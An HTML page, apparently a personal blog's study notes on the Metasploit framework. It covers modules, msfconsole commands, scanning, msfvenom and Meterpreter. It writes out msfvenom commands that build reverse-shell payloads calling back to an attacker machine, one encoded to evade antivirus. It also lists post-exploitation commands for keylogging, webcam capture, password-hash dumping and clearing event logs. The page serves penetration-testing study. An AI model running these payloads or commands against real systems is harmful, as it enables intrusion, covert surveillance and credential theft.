@@ -1,0 +1,744 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/rainou/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=rainou/livereload" data-no-instant defer></script>
+  <title>
+  Metasploit · Rain Notes
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Rain Ou">
+<meta name="description" content="
+  Metasploit
+  
+    
+    Link to heading
+  
+
+
+A exploitation framework
+Metasploit is a powerful tool that can support all phases of a penetration testing engagement, from information gathering to post-exploitation
+Allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more
+
+
+  Main Components
+  
+    
+    Link to heading
+  
+
+
+  msfconsole
+  
+    
+    Link to heading
+  
+
+Stands for MetaSploit Framework console
+The main command-line interface.
+(msfconsole is the command to run metasploit)">
+<meta name="keywords" content="notes,cybersecurity,music,share">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Metasploit">
+  <meta name="twitter:description" content="Metasploit Link to heading A exploitation framework Metasploit is a powerful tool that can support all phases of a penetration testing engagement, from information gathering to post-exploitation Allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more Main Components Link to heading msfconsole Link to heading Stands for MetaSploit Framework console The main command-line interface. (msfconsole is the command to run metasploit)">
+
+<meta property="og:url" content="http://localhost:1313/rainou/cyber/metasploit/">
+  <meta property="og:site_name" content="Rain Notes">
+  <meta property="og:title" content="Metasploit">
+  <meta property="og:description" content="Metasploit Link to heading A exploitation framework Metasploit is a powerful tool that can support all phases of a penetration testing engagement, from information gathering to post-exploitation Allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more Main Components Link to heading msfconsole Link to heading Stands for MetaSploit Framework console The main command-line interface. (msfconsole is the command to run metasploit)">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="cyber">
+    <meta property="article:published_time" content="2025-03-17T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-03-17T00:00:00+00:00">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/rainou/cyber/metasploit/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/rainou/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/rainou/css/coder-dark.css" media="screen">
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/rainou/">
+      Rain Notes
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/rainou/cyber/">Cyber</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/rainou/music/">Music</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/rainou/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container page">
+  <article>
+    <header>
+      <h1 class="title">
+        <a class="title-link" href="http://localhost:1313/rainou/cyber/metasploit/">
+          Metasploit
+        </a>
+      </h1>
+    </header>
+
+    <h1 id="metasploit">
+  Metasploit
+  <a class="heading-link" href="#metasploit">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<ul>
+<li>A exploitation framework</li>
+<li>Metasploit is a powerful tool that can support all phases of a penetration testing engagement, from information gathering to post-exploitation</li>
+<li>Allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more</li>
+</ul>
+<h2 id="main-components">
+  Main Components
+  <a class="heading-link" href="#main-components">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<h3 id="msfconsole">
+  <code>msfconsole</code>
+  <a class="heading-link" href="#msfconsole">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Stands for MetaSploit Framework console
+The main command-line interface.
+(<code>msfconsole</code> is the command to run metasploit)</p>
+<h3 id="modules">
+  Modules
+  <a class="heading-link" href="#modules">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>supporting modules such as exploits, scanners, payloads, etc.</li>
+<li>small component build to support a specific task</li>
+</ul>
+<h3 id="tools">
+  Tools
+  <a class="heading-link" href="#tools">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Stand-alone custom build tools
+Example tools:</p>
+<ul>
+<li><code>msfvenom</code>: can generate payload (have replaced Msfpayload and Msfencode)
+<ul>
+<li>Access to all payload</li>
+<li>Create payload to all different format (PHP, exe, dll, elf, etc.)</li>
+<li>and for many diffferent target system (Apple, Windows, Android, Linux, etc.).</li>
+</ul>
+</li>
+<li>pattern_create</li>
+<li>pattern_offset</li>
+</ul>
+<h2 id="terminology">
+  Terminology
+  <a class="heading-link" href="#terminology">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li>Exploit: A piece of code that uses a vulnerability present on the target system.</li>
+<li>Vulnerability: A design, coding, or logic flaw affecting the target system.</li>
+<li>Payload: the code that will run on the target system.</li>
+</ul>
+<h3 id="module-and-category">
+  Module and category
+  <a class="heading-link" href="#module-and-category">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li><strong>Auxilliary</strong>: Any supporting module, such as scanners, crawlers and fuzzers</li>
+<li><strong>Encoders</strong>: encode the exploit and payload to avoid signature-based antivirus detection (nowadays have limited success)</li>
+<li><strong>Evasion</strong>: evade antivirus software</li>
+<li><strong>Exploits</strong>: organized by target system</li>
+<li><strong>NOPs</strong>: (No OPeration) do nothing
+<ul>
+<li>They are often used as a buffer to achieve consistent payload sizes. Represented in CPU family</li>
+</ul>
+</li>
+<li><strong>Payloads</strong>: codes that run malware or backdoor to the target system
+<ul>
+<li>A playload that allow to run command on the target system is called <code>shell</code></li>
+<li><strong>adapters</strong>: An adapter wraps single payloads to convert them into different formats. e.g. wrapped in Powershell adapter means a single powershell command can execute the payload</li>
+<li><strong>singles</strong>: Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.</li>
+<li><strong>stagers</strong>:  (The initiator to download the whole payload) Responsible for setting up a connection channel between Metasploit and the target system. e.g. “Staged payloads” uploads a stager, then stager download the rest of the payload (stage).
+<ul>
+<li>stagers is loaded directly to the memory, and thus easier to bypass by the antivirus detection</li>
+<li><strong>stages</strong>: The process of downloading the large payload
+<ul>
+<li>To differentiate stagers and stage:</li>
+<li>generic/shell_reverse_tcp: stagers when <code>_</code> between <code>shell_reverse</code></li>
+<li>windows/x64/shell/reverse_tcp: stage payload when <code>shell/reverse</code></li>
+</ul>
+</li>
+<li>Usually require a special listener, such as the Metasploit multi/handler</li>
+</ul>
+</li>
+<li><strong>Stageless</strong>: The opposite of stagers, slef-contained piece of code can be executed on the spot.
+<ul>
+<li>Its buskiness allow easier detection on an antivirus or intrusion detection program.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Post</strong>: Usefull for the final stage of the pen-test: post-exploitation</li>
+</ul>
+<h1 id="general-commands-to-metasploit">
+  General Commands to Metasploit
+  <a class="heading-link" href="#general-commands-to-metasploit">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<h2 id="summary-command">
+  Summary Command
+  <a class="heading-link" href="#summary-command">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p><code>info</code>
+<code>tab</code>
+<code>search type:[type name]</code>
+<code>use [number]</code>
+<code>show options</code> or <code>options</code>
+<code>show payloads</code>
+<code>set payloads</code>
+<code>set</code> <code>setg</code>
+<code>unset [param]</code>
+<code>unset all</code>
+<code>exploit</code>, <code>exploit -z</code>, <code>exploit -j</code> (run as background), <code>run</code>
+<code>sessions</code></p>
+<ul>
+<li><code>info</code> further information on the module can be obtained by typing the info command</li>
+<li><code>tab</code>, Command can be auto completed</li>
+<li>Run metasploit as admin permission is required if listen on a port under 1024.</li>
+</ul>
+<h2 id="searchselect-the-module">
+  Search/select the module
+  <a class="heading-link" href="#searchselect-the-module">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li><code>search</code> search the Metasploit Framework database for modules relevant to the given search parameter
+<ul>
+<li>conduct searches using CVE numbers, exploit names (eternalblue, heartbleed, etc.), or target system.</li>
+<li><code>use 0</code>, things can be selected with searched number</li>
+<li>Can direct the search function using keywords such as type and platform
+<ul>
+<li><code>search type:auxiliary telnet</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>search type:auxiliary telnet</code></li>
+</ul>
+<h2 id="select-module">
+  Select Module
+  <a class="heading-link" href="#select-module">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li><code>use exploit/windows/smb/ms17_010_eternalblue</code></li>
+<li><code>show options</code>: show the current parameter
+<ul>
+<li><code>show</code> can be followed by any module type: auxiliary, payload, exploit</li>
+<li><code>show auxiliary</code> <code>use 1128</code> exploit can be selected with the number</li>
+</ul>
+</li>
+</ul>
+<h2 id="select-payloads">
+  Select payloads
+  <a class="heading-link" href="#select-payloads">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li><code>show payloads</code> show other payloads that can be used with the exploit</li>
+<li><code>set payloads [number]</code></li>
+<li><code>back</code> to go back a level (module wise)</li>
+</ul>
+<h2 id="set-parameters">
+  Set parameters
+  <a class="heading-link" href="#set-parameters">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li><code>set</code>,  <code>unset [param]</code>, <code>unset all</code></li>
+<li><code>setg</code> set param for global module, <code>unsetg</code> or exit to clear it</li>
+<li><code>RHOSTS</code>:
+<ul>
+<li>can set to single IP address</li>
+<li>can set to a range of address <code>10.10.132.12/16</code></li>
+<li>can set to a file with listed address <code>/path/of/the/target_file.txt</code>, one per line</li>
+</ul>
+</li>
+<li>Msfconsole is managed by context; this means that <strong>unless set as a global variable</strong>, <strong>all parameter settings will be lost if you change the module</strong> you have decided to use</li>
+</ul>
+<h3 id="exploit">
+  Exploit
+  <a class="heading-link" href="#exploit">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li><code>exploit</code>, <code>run</code>(is an alias to exploit) to launch the module
+<ul>
+<li><code>exploit -z</code> will background the session</li>
+</ul>
+</li>
+<li><code>check</code> check if the target system is vulnerable without exploiting it.</li>
+</ul>
+<h3 id="post-exploit">
+  Post-exploit
+  <a class="heading-link" href="#post-exploit">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li><code>sessions</code> to see the connected session</li>
+<li>when within the meterpreter interface, use <code>background</code> or <code>CTRL+Z</code> to go back to the msf6 interface</li>
+<li><code>sessions -i [number]</code> to interact with any sessions</li>
+<li><code>sessions -h</code> for more help</li>
+<li><code>CTRL+Z</code> background</li>
+<li><code>CTRL+C</code> abort</li>
+<li>Meterpreter: Meterpreter agent was loaded to the target system and connected back to you, similar to connecting to their database</li>
+<li>hashdump module dump the user password hash in ntlm format</li>
+</ul>
+<h2 id="scanning">
+  Scanning
+  <a class="heading-link" href="#scanning">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p><code>search portscan</code>,</p>
+<ul>
+<li>portscan options
+<ul>
+<li><code>scanner/portscan/tcp</code></li>
+<li>CONCURRENCY: Number of targets to be scanned simultaneously.</li>
+<li>PORTS: Port range to be scanned. Please note that 1-1000 here will not be the same as using Nmap with the default configuration. Nmap will scan the 1000 most used ports, while Metasploit will scan port numbers from 1 to 10000.</li>
+<li>RHOSTS: Target or target network to be scanned.</li>
+<li>THREADS: Number of threads that will be used simultaneously. More threads will result in faster scans.</li>
+<li>use of <code>nmap -sS 10.10.12.229</code> might be faster than the msf module</li>
+</ul>
+</li>
+<li><code>scanner/discovery/udp_sweep</code> quickly identify running service</li>
+<li><code>smb_enumshares</code> and <code>smb_version</code> useful for coorporate network</li>
+<li>When performing service scans, it would be <strong>important not to omit more &ldquo;exotic&rdquo; services</strong> such as NetBIOS</li>
+</ul>
+<h2 id="database">
+  Database
+  <a class="heading-link" href="#database">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li>start the PostgreSQL <code>systemctl start postgresql</code></li>
+<li>initialize database <code>msfdb init</code></li>
+<li>lauch <code>msfconsole</code> and check database <code>db_status</code>, note that the <code>help</code> command will showing database related help after lauching db services</li>
+<li><code>workspace</code> to list available workspace</li>
+<li><code>workspace -a [name]</code> to add workspace</li>
+<li><code>workspace -d [name]</code> to delete workspace</li>
+<li><code>workspace [name]</code> to switch workspace</li>
+<li><code>workspace -h</code> to list available option for workspace</li>
+<li><code>db_nmap</code> use nmap and record the output</li>
+<li><code>hosts</code> <code>services</code> can reach relevant information with these command</li>
+<li><code>hosts -h</code> <code>services -h</code> more information about the command</li>
+<li><code>hosts -R</code> add hosts value (in database) to RHOSTS parameter</li>
+</ul>
+<h3 id="rank-of-the-exploit">
+  Rank of the exploit:
+  <a class="heading-link" href="#rank-of-the-exploit">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p><img src="../../../_resources/Screenshot%202024-01-26%20at%201.41.03%E2%80%AFAM.png" alt="Rank of the exploit">
+<a href="https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking"  class="external-link" target="_blank" rel="noopener">Source of the picture</a></p>
+<h1 id="msfvenom">
+  Msfvenom
+  <a class="heading-link" href="#msfvenom">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<ul>
+<li>Simply put Msfvenom is &ldquo;Reformatting the payload that is dedicated to metasploit into target system compatible executable file&rdquo;</li>
+<li><code>msfvenom --list formats</code> list supported output formats</li>
+<li>Encoders, can be useful  against some antivirus software
+<ul>
+<li>sample usage: <code>msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64</code></li>
+</ul>
+</li>
+<li>Handlers is used to reveice the reverse shell message, also known as &ldquo;catching a shell&rdquo;</li>
+<li>Standard Syntax: <code>msfvenom -p &lt;PAYLOAD&gt; &lt;OPTIONS&gt;</code>
+<ul>
+<li>e.g. <code>msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=&lt;listen-IP&gt; LPORT=&lt;listen-port&gt;</code></li>
+</ul>
+</li>
+<li>Steps:
+<ul>
+<li>Create and convert the payload (preparation)</li>
+<li><strong>Set LHOST and LPORT, note that the file will be send via an alternative channel, hence we want it to automatically connect to our session when executed, thus the LHOST and LPORT with be the attacks machine.</strong>
+<ul>
+<li>Give the local machine IP address: LHOST will be the IP address of your attacking machine</li>
+<li>Give local port to which the payload will connect: LPORT will be the port on which your handler will listen</li>
+<li>e.g. <code>msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw &gt; reverse_shell.php</code></li>
+<li>note that the name of the payload in msfconsole is <code>payload/php/reverse_php</code></li>
+</ul>
+</li>
+<li><code>use exploit/multi/handler</code> start a handlers in metasploit</li>
+<li>set the parameter e.g. <code>set payload php/reverse_php</code>, <code>set lhost 10.0.2.19</code>, <code>set lport 7777</code></li>
+<li><code>exploit</code> on msfconsole</li>
+</ul>
+</li>
+<li>Some converted file (such as converted php files) needs to be manually fixed
+<ul>
+<li>e.g. php file header tag and end tag needs to be fixed properly with <code>&lt;?php [content] ?&gt;</code></li>
+</ul>
+</li>
+<li>List the possible payload that can be ran with meterpreter: <code>msfvenom --list payloads | grep meterpreter</code></li>
+<li>Example command and format:
+<ul>
+<li>Linux excutable (elf): <code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf &gt; rev_shell.elf</code> run <code>./rev_shell.elf</code> on the target machine.</li>
+<li>Windows (exe): <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe &gt; rev_shell.exe</code></li>
+<li>PHP: <code>msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw &gt; rev_shell.php</code></li>
+<li>ASP: <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp &gt; rev_shell.asp</code></li>
+<li>Python: <code>msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw &gt; rev_shell.py</code>
+*The <code>-p</code> means the payload that exist within the metasploit
+*<strong>Usually the payload is already written in the certain system language indicated by <code>windows/</code>, <code>linux/</code>, the goal of the conversion like <code>-f exe &gt; rev_shell.exe</code>  is to turn them to an actual executable file of the related system (the original file is only usuable within the metasploit framework), hence the <code>-f</code> option simply means turn it into &rsquo;the format that is allowed to be executed on the target system&rsquo;.</strong></li>
+</ul>
+</li>
+</ul>
+<h2 id="naming-convention">
+  Naming convention
+  <a class="heading-link" href="#naming-convention">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li>Payload naming convention
+<ul>
+<li><code>&lt;OS&gt;/&lt;arch&gt;/&lt;payload&gt;</code></li>
+<li>e.g. <code>linux/x86/shell_reverse_tcp</code></li>
+<li>exception for Windows 32 bit: <code>windows/shell_reverse_tcp</code></li>
+<li>Windows 64 bit: <code>windows/x64/shell_reverse_tcp</code></li>
+</ul>
+</li>
+<li>Reverse shell naming convention:
+<ul>
+<li>Stageless with <code>_</code>: <code>shell_reverse_tcp</code></li>
+<li>Staged with <code>/</code>: <code>shell/reverse_tcp</code></li>
+</ul>
+</li>
+<li>Rules applied to Meterpreter
+<ul>
+<li>Stageless: <code>linux/x86/meterpreter_reverse_tcp</code></li>
+<li>Staged: <code>windows/x64/meterpreter/reverse_tcp</code></li>
+<li><code>msfvenom --list payloads | grep &quot;linux/x86/metepreter&quot;</code></li>
+</ul>
+</li>
+</ul>
+<h1 id="meterpreter">
+  Meterpreter
+  <a class="heading-link" href="#meterpreter">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<ul>
+<li>run within memory</li>
+<li>disguised as a processor</li>
+<li>Has multiple version, the factor that influence which version to use are the following three
+<ul>
+<li>The target OS</li>
+<li>Components available on the target system e.g. python, java, etc</li>
+<li>Network connection types you can have with the target system e.g. TCP, HTTPS, etc</li>
+</ul>
+</li>
+<li>Some exploit by default uses meterpreter e.g. <code>exploit/windows/smb/ms17_010_eternalblue</code></li>
+<li>use <code>post/multi/manage/shell_to_meterpreter</code> to convert from shell to meterpreter</li>
+<li><code>ctrl+z</code> to set the current session to background</li>
+</ul>
+<h2 id="general-commands-meterpreter">
+  General Commands Meterpreter
+  <a class="heading-link" href="#general-commands-meterpreter">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li><code>help</code> different version OS meterpreter has different command.</li>
+<li>Three type of category of tools:
+<ul>
+<li>Built-in commands</li>
+<li>Meterpreter tools</li>
+<li>Meterpreter scripting</li>
+</ul>
+</li>
+</ul>
+<h3 id="basic-commands">
+  Basic Commands
+  <a class="heading-link" href="#basic-commands">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li><strong>Core commands</strong>:
+<code>background</code>: Backgrounds the current session
+<code>exit</code>: Terminate the Meterpreter session
+<code>guid</code>: Get the session GUID (Globally Unique Identifier)
+<code>help</code>: Displays the help menu
+<code>info</code>: Displays information about a Post module
+<code>irb</code>: Opens an interactive Ruby shell on the current session
+-&gt; <code>load</code>: Loads one or more Meterpreter extensions
+e.g. <code>load kiwi</code>, after loading the <code>help</code> command will include kiwi module help info
+-&gt; <code>migrate [PID]</code>: Allows you to migrate Meterpreter to another process
+*Once the highter privilage move down, it might not be able to go back
+<code>run</code>: Executes a Meterpreter script or Post module
+<code>sessions [number]</code>: Quickly switch to another session</li>
+<li><strong>File system commands</strong>
+<code>cd</code>: Will change directory
+<code>ls</code>: Will list files in the current directory (dir will also work)
+<code>pwd</code>: Prints the current working directory
+<code>edit</code>: will allow you to edit a file
+<code>cat</code>: Will show the contents of a file to the screen
+<code>rm</code>: Will delete the specified file
+-&gt; <code>search</code>: Will search for files
+e.g. <code>search -f [filename]</code>
+<code>upload</code>: Will upload a file or directory
+<code>download</code>: Will download a file or directory</li>
+<li><strong>Networking commands</strong>
+<code>arp</code>: Displays the host ARP (Address Resolution Protocol) cache
+<code>ifconfig</code>: Displays network interfaces available on the target system
+<code>netstat</code>: Displays the network connections
+<code>portfwd</code>: Forwards a local port to a remote service
+<code>route</code>: Allows you to view and modify the routing table</li>
+<li><strong>System commands</strong>
+<code>clearev</code>: Clears the event logs
+<code>execute</code>: Executes a command
+<code>getpid</code>: Shows the current process identifier
+-&gt; <code>getuid</code>: Shows the user that Meterpreter is running as
+<code>kill</code>: Terminates a process
+<code>pkill</code>: Terminates processes by name
+-&gt; <code>ps</code>: Lists running processes
+<code>reboot</code>: Reboots the remote computer
+-&gt; <code>shell</code>: Drops into a system command shell
+<code>shutdown</code>: Shuts down the remote computer
+<code>sysinfo</code>: Gets information about the remote system, such as OS</li>
+<li>All other commands including:
+<ul>
+<li>User interface commands</li>
+<li>Webcam commands</li>
+<li>Audio output commands</li>
+<li>Elevate commands</li>
+<li>Password database commands</li>
+<li>Timestomp commands
+<code>idletime</code>: Returns the number of seconds the remote user has been idle
+-&gt; <code>keyscan_dump</code>: Dumps the keystroke buffer
+-&gt; <code>keyscan_start</code>: Starts capturing keystrokes
+-&gt; <code>keyscan_stop</code>: Stops capturing keystrokes
+<code>screenshare</code>: Allows you to watch the remote user&rsquo;s desktop in real time
+<code>screenshot</code>: Grabs a screenshot of the interactive desktop
+<code>record_mic</code>: Records audio from the default microphone for X seconds
+<code>webcam_chat</code>: Starts a video chat
+<code>webcam_list</code>: Lists webcams
+<code>webcam_snap</code>: Takes a snapshot from the specified webcam
+<code>webcam_stream</code>: Plays a video stream from the specified webcam
+-&gt; <code>getsystem</code>: Attempts to elevate your privilege to that of local system
+-&gt; <code>hashdump</code>: Dumps the contents of the SAM database</li>
+</ul>
+</li>
+</ul>
+
+  </article>
+</section>
+
+  
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+    2025
+     Rain Ou 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/rainou/js/coder.js"></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
